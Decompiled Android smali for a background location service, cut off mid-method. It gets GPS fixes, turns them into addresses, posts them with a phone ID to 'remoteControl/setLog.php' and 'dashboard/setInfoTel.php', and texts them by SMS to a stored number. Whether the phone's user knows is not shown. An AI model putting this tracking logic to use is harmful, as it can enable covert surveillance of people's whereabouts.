.class public Lcom/app/service/ServiceLoc;
.super Landroid/app/Service;
.source "ServiceLoc.java"

# interfaces
.implements Lfk$b;
.implements Lfk$c;
.implements Lwk;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/app/service/ServiceLoc$d;,
        Lcom/app/service/ServiceLoc$b;,
        Lcom/app/service/ServiceLoc$c;,
        Lcom/app/service/ServiceLoc$a;
    }
.end annotation


# static fields
.field public static a:Z


# instance fields
.field private final b:J

.field private final c:J

.field private final d:J

.field private final e:J

.field private final f:J

.field private g:Lfk;

.field private h:Lcom/google/android/gms/location/LocationRequest;

.field private i:Landroid/location/Location;

.field private j:Landroid/os/Handler;

.field private k:Ljava/lang/Runnable;

.field private l:Landroid/os/Handler;

.field private m:Ljava/lang/Runnable;

.field private n:Landroid/os/Handler;

.field private o:Ljava/lang/Runnable;

.field private p:Landroid/os/Handler;

.field private q:Ljava/lang/Runnable;

.field private r:Ljava/lang/String;

.field private s:Ljava/lang/String;

.field private t:Ljava/lang/String;

.field private u:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private v:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 43
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const-wide/32 v0, 0xea60

    .line 47
    iput-wide v0, p0, Lcom/app/service/ServiceLoc;->b:J

    const-wide/16 v0, 0x7530

    .line 48
    iput-wide v0, p0, Lcom/app/service/ServiceLoc;->c:J

    const-wide/16 v0, 0x1388

    .line 49
    iput-wide v0, p0, Lcom/app/service/ServiceLoc;->d:J

    const-wide/16 v0, 0x3e8

    .line 50
    iput-wide v0, p0, Lcom/app/service/ServiceLoc;->e:J

    const-wide/16 v0, 0x1f4

    .line 51
    iput-wide v0, p0, Lcom/app/service/ServiceLoc;->f:J

    const/4 v0, 0x0

    .line 55
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->j:Landroid/os/Handler;

    .line 56
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->k:Ljava/lang/Runnable;

    .line 57
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->l:Landroid/os/Handler;

    .line 58
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->m:Ljava/lang/Runnable;

    .line 59
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->n:Landroid/os/Handler;

    .line 60
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->o:Ljava/lang/Runnable;

    .line 61
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->p:Landroid/os/Handler;

    .line 62
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->q:Ljava/lang/Runnable;

    return-void
.end method

.method static synthetic a(Lcom/app/service/ServiceLoc;)Ljava/lang/String;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->s:Ljava/lang/String;

    return-object p0
.end method

.method private declared-synchronized a()V
    .locals 2

    monitor-enter p0

    .line 162
    :try_start_0
    new-instance v0, Lfk$a;

    invoke-direct {v0, p0}, Lfk$a;-><init>(Landroid/content/Context;)V

    .line 163
    invoke-virtual {v0, p0}, Lfk$a;->a(Lfk$b;)Lfk$a;

    move-result-object v0

    .line 164
    invoke-virtual {v0, p0}, Lfk$a;->a(Lfk$c;)Lfk$a;

    move-result-object v0

    sget-object v1, Lwl;->a:Lfi;

    .line 165
    invoke-virtual {v0, v1}, Lfk$a;->a(Lfi;)Lfk$a;

    move-result-object v0

    .line 166
    invoke-virtual {v0}, Lfk$a;->a()Lfk;

    move-result-object v0

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->g:Lfk;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 167
    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0
.end method

.method private b(Landroid/location/Location;)Ljava/lang/String;
    .locals 7

    const v0, 0x7f0f0042

    .line 395
    :try_start_0
    new-instance v1, Landroid/location/Geocoder;

    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Landroid/location/Geocoder;-><init>(Landroid/content/Context;Ljava/util/Locale;)V

    .line 397
    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v4

    const/4 v6, 0x1

    invoke-virtual/range {v1 .. v6}, Landroid/location/Geocoder;->getFromLocation(DDI)Ljava/util/List;

    move-result-object p1

    if-eqz p1, :cond_5

    const/4 v1, 0x0

    .line 399
    invoke-interface {p1, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/location/Address;

    const-string v2, ""

    if-eqz p1, :cond_0

    .line 402
    invoke-virtual {p1, v1}, Landroid/location/Address;->getAddressLine(I)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    .line 403
    invoke-virtual {p1, v1}, Landroid/location/Address;->getAddressLine(I)Ljava/lang/String;

    move-result-object v2

    goto/16 :goto_0

    :cond_0
    if-eqz p1, :cond_4

    .line 405
    invoke-virtual {p1}, Landroid/location/Address;->getFeatureName()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    .line 406
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/location/Address;->getFeatureName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 408
    :cond_1
    invoke-virtual {p1}, Landroid/location/Address;->getPostalCode()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_2

    .line 409
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ", "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/location/Address;->getPostalCode()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 411
    :cond_2
    invoke-virtual {p1}, Landroid/location/Address;->getLocality()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_3

    .line 412
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/location/Address;->getLocality()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    move-object v2, v1

    .line 414
    :cond_3
    invoke-virtual {p1}, Landroid/location/Address;->getCountryName()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    .line 415
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/location/Address;->getCountryName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_4
    :goto_0
    return-object v2

    .line 420
    :cond_5
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    .line 423
    :catch_0
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method private b()V
    .locals 3
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Throwable;
        }
    .end annotation

    .line 184
    sget-object v0, Lwl;->b:Lwj;

    iget-object v1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    iget-object v2, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    invoke-interface {v0, v1, v2, p0}, Lwj;->a(Lfk;Lcom/google/android/gms/location/LocationRequest;Lwk;)Lfl;

    return-void
.end method

.method static synthetic b(Lcom/app/service/ServiceLoc;)V
    .locals 9

    .line 2301
    :try_start_0
    invoke-static {}, Ler;->e()Ljava/text/SimpleDateFormat;

    move-result-object v0

    .line 2303
    sget-object v1, Lcw;->n:Ljava/lang/String;

    .line 2304
    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v4

    .line 2306
    iget-object v2, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    if-eqz v2, :cond_0

    .line 2307
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-direct {p0, v1}, Lcom/app/service/ServiceLoc;->b(Landroid/location/Location;)Ljava/lang/String;

    move-result-object v1

    .line 2309
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v5, 0x7f0f0041

    invoke-virtual {v3, v5}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " - <span class=\'linkMap\' onClick=\"viewMapRemote(\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2311
    invoke-virtual {v3}, Landroid/location/Location;->getLatitude()D

    move-result-wide v5

    invoke-virtual {v2, v5, v6}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-virtual {v3}, Landroid/location/Location;->getLongitude()D

    move-result-wide v5

    invoke-virtual {v2, v5, v6}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2312
    invoke-virtual {v3}, Landroid/location/Location;->getAccuracy()F

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-virtual {v3}, Landroid/location/Location;->getTime()J

    move-result-wide v5

    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\',\'"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\'"

    const-string v3, "\\\'"

    .line 2313
    invoke-virtual {v1, v0, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\');\">"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f0f0142

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "</span>"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    move-object v7, v1

    goto :goto_0

    :cond_0
    move-object v7, v1

    .line 2317
    :goto_0
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    .line 2318
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v1, "idPhone"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p0}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2319
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v1, "dateConnexion"

    invoke-virtual {v0, v1, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2320
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v1, "idLog"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->r:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2321
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v1, "data"

    invoke-virtual {v0, v1, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2323
    invoke-static {p0}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    const-string v5, "GetLocation"

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->r:Ljava/lang/String;

    .line 2324
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    move-object v8, p0

    .line 2323
    invoke-static/range {v3 .. v8}, Lu;->a(ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)J

    move-result-wide v0

    const-string v2, "remoteControl/setLog.php"

    .line 2326
    iget-object v3, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    invoke-static {v2, v3}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v2

    if-eqz v2, :cond_1

    long-to-int v1, v0

    .line 2327
    invoke-static {v1, p0}, Lu;->g(ILandroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 2330
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 2333
    :cond_1
    :goto_1
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    return-void
.end method

.method private c()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Throwable;
        }
    .end annotation

    .line 188
    sget-object v0, Lwl;->b:Lwj;

    iget-object v1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-interface {v0, v1, p0}, Lwj;->a(Lfk;Lwk;)Lfl;

    return-void
.end method

.method static synthetic c(Lcom/app/service/ServiceLoc;)V
    .locals 6

    .line 2338
    :try_start_0
    invoke-static {}, Ler;->e()Ljava/text/SimpleDateFormat;

    move-result-object v0

    .line 2339
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-virtual {v1}, Landroid/location/Location;->getTime()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 2340
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-direct {p0, v1}, Lcom/app/service/ServiceLoc;->b(Landroid/location/Location;)Ljava/lang/String;

    move-result-object v1

    .line 2342
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " - <span class=linkMap onClick=\"viewMap(\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2344
    invoke-virtual {v3}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-virtual {v3}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2345
    invoke-virtual {v3}, Landroid/location/Location;->getAccuracy()F

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\',\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\'"

    const-string v4, "\\\'"

    .line 2346
    invoke-virtual {v1, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\',\'"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\');\">"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2347
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v3, 0x7f0f0142

    invoke-virtual {v1, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "</span>"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 2350
    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    iput-object v2, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    .line 2351
    iget-object v2, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v3, "idPhone"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p0}, Lda;->f(Landroid/content/Context;)I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2352
    iget-object v2, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v3, "dateConnexion"

    invoke-virtual {v2, v3, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2353
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v2, "type"

    const-string v3, "lastPositionGPS"

    invoke-virtual {v0, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 2354
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    const-string v2, "data"

    invoke-virtual {v0, v2, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "dashboard/setInfoTel.php"

    .line 2356
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->u:Ljava/util/HashMap;

    invoke-static {v0, v1}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 2358
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 2361
    :goto_0
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    return-void
.end method

.method static synthetic d(Lcom/app/service/ServiceLoc;)V
    .locals 7

    .line 2366
    :try_start_0
    invoke-static {}, Ler;->e()Ljava/text/SimpleDateFormat;

    move-result-object v0

    .line 2369
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    if-nez v1, :cond_0

    .line 2370
    sget-object v0, Lcw;->n:Ljava/lang/String;

    goto :goto_0

    .line 2372
    :cond_0
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-virtual {v1}, Landroid/location/Location;->getTime()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 2373
    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    invoke-direct {p0, v1}, Lcom/app/service/ServiceLoc;->b(Landroid/location/Location;)Ljava/lang/String;

    move-result-object v1

    .line 2375
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f0f0041

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ": "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\nLat: "

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2376
    invoke-virtual {v1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v1, "\nLong: "

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2377
    invoke-virtual {v1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v1, "\n"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2378
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v3, 0x7f0f002c

    invoke-virtual {v1, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ": "

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 2379
    invoke-virtual {v1}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    const-string v1, "\nDate: "

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 2383
    :goto_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v1

    .line 2384
    invoke-virtual {v1, v0}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v4

    .line 2385
    iget-object v2, p0, Lcom/app/service/ServiceLoc;->t:Ljava/lang/String;

    const/4 v3, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

